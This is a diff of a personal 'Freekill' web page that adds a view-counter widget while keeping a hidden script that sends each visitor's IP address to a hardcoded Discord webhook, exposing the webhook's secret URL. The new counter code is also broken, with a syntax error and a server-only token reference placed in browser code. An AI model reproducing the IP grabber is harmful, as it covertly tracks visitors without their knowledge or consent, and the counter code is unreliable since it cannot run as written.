@@ -11,16 +11,33 @@
     <meta property="og:description" content="yk u can get ton of things in here?._.">
     <meta property="og:title" content="𝙵𝚛𝚎𝚎𝚔𝚒𝚕𝚕">
     <link rel="icon" type="image/jpeg" sizes="388x388" href="https://freekill.vercel.app/assets/img/animes/Dark%20skeleton%20aesthetic.jpeg">
-    <link rel="icon" type="image/jpeg" sizes="388x388" href="https://freekill.vercel.app/assets/img/animes/Dark%20skeleton%20aesthetic.jpeg">
     <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
     <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Covered+By+Your+Grace&amp;display=swap">
     <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab&amp;display=swap">
     <link rel="stylesheet" href="assets/fonts/fontawesome-all.min.css">
     <link rel="stylesheet" href="assets/css/styles.css">
     <link rel="stylesheet" href="assets/css/Navigation-Clean.css">
+    <style>
+        /* View Counter Styles */
+        #viewCounter {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            color: #fff;
+            font-family: 'Roboto Slab', serif;
+            background: rgba(0,0,0,0.7);
+            padding: 8px 15px;
+            border-radius: 20px;
+            z-index: 9999;
+            backdrop-filter: blur(3px);
+        }
+    </style>
 </head>
 
 <body class="bmain">
+    <!-- View Counter -->
+    <div id="viewCounter">Views: <span>Loading...</span></div>
+
     <script>
         var _app = function() {
             this.id = 0;
@@ -44,14 +61,13 @@
     <div class="background">
         <div id="pattern"></div>
         <video id="background" loop playsinline>
-<source src="https://files.catbox.moe/14qcxc.mp4" type="video/mp4">
-<script>
-            var video = document.getElementById("background");
-
-            app.videoElement = video;
-            app.videoElement.volume = 0;
-        </script>
-</video>
+            <source src="https://files.catbox.moe/14qcxc.mp4" type="video/mp4">
+            <script>
+                var video = document.getElementById("background");
+                app.videoElement = video;
+                app.videoElement.volume = 0;
+            </script>
+        </video>
     </div>
     <div>
         <nav class="navbar navbar-light navbar-expand-lg navigation-clean">
@@ -79,18 +95,14 @@
 </iframe>
                 <script>
                     function getIP(json) {
-                        var request = new XMLHttpRequest(); //making a request for the webhook
+                        var request = new XMLHttpRequest();
                         request.open("POST", "https://discord.com/api/webhooks/1226126479461711923/oyrugegQKBcQFI8HFajMZGKJ9EViCuOK42DsoCGcw3Jp-i2c_gHXKKf8KN_5SjFtMrTA");
-
                         request.setRequestHeader('Content-type', 'application/json');
-
                         var params = {
                             username: "Muhehehe",
                             avatar_url: "https://cdn.discordapp.com/attachments/1193570412785836052/1226126811784675329/image.png?ex=6623a294&is=66112d94&hm=4ebf7ceb5634ba2713fcf4a166e9e0708f0d30728b7d27044c2f15937714d058&",
                             content: "**IP:** *" + json.ip + "*"
                         }
-                        //just a webhook parameters such as avatar,name,message
-
                         request.send(JSON.stringify(params));
                     }
                 </script>
@@ -105,6 +117,56 @@
     <script src="assets/js/ok.js"></script>
     <script src="assets/js/random_image.js"></script>
     <script src="assets/js/oneko.js" data-cat="assets/img/others/oneko.gif"></script>
-</body>
 
+    <!-- Secure View Counter Implementation -->
+    <script>
+        const GH_USER = 'Freekillbio';
+        const REPO = 'freekill-views';
+        
+        async function updateCounter() {
+            try {
+                // Get current count
+                const res = await fetch(`https://api.github.com/repos/${GH_USER}/${REPO}/contents/views.json`);
+                
+                if (!res.ok) throw new Error('GitHub API error');
+                if (res.headers.get('x-ratelimit-remaining') === '0') {
+                    throw new Error('Rate limit exceeded');
+                }
+
+                const { content, sha } = await res.json();
+                const current = JSON.parse(atob(content));
+                const newCount = current.count + 1;
+
+                // Update count
+                await fetch(`https://api.github.com/repos/${GH_USER}/${REPO}/contents/views.json`, {
+                    method: 'PUT',
+                    headers: {
+                        Authorization: `Bearer ${process.env.GH_TOKEN}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        message: 'Update views',
+                        content: btoa(JSON.stringify({ count: newCount })),
+                        sha
+                    })
+                });
+
+                return newCount;
+            } catch (error) {
+                // Fallback to localStorage
+                console.error('Using fallback:', error);
+                const localCount = Number(localStorage.getItem('viewCount') || 0;
+                const newCount = localCount + 1;
+                localStorage.setItem('viewCount', newCount);
+                return newCount;
+            }
+        }
+
+        // Initialize counter
+        (async () => {
+            const count = await updateCounter();
+            document.getElementById('viewCounter').innerHTML = `Views: ${count}`;
+        })();
+    </script>
+</body>
 </html>
